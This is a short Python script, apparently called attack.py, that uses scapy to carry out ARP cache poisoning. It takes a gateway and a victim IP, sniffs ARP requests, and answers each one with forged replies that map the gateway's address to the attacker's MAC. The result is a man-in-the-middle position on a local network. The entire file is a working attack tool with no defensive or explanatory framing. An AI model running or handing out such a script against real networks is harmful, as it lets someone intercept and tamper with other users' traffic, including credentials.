#!/usr/bin/env python3

from scapy.all import sniff, ARP, send, Ether, RandNum, sendp
import netifaces

def params():
    import sys

    if len(sys.argv) != 3:
        print('Usage: sudo ./attack.py <gateway> <victim-ip>')
        exit(1)

    return sys.argv[1], sys.argv[2]

def get_mac_address(interface='eth0'):
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    except KeyError:
        print(f"\033[1;31m[!] MAC address not found for interface: {interface}\033[0m")
        exit(1)

def is_sudo():
    import os

    return os.geteuid() == 0

if not is_sudo():
    print('\033[1;31m[!] Sorry! You should run this script as sudo\033[0m')
    exit(1)

mac_address = get_mac_address()
gateway, victim_ip = params()

def spoof(pkt):
    if ARP in pkt and pkt[ARP].op == 1:
        print('\033[1;36m[*] Poisoning\033[0m')

        arp_packet = ARP(op=2, pdst=victim_ip, hwdst=mac_address, psrc=gateway)
        send(arp_packet, count=4, verbose=False)

        print('\033[1;32m[+] Poisoned\033[0m')

sniff(prn=spoof, filter="arp", store=0)

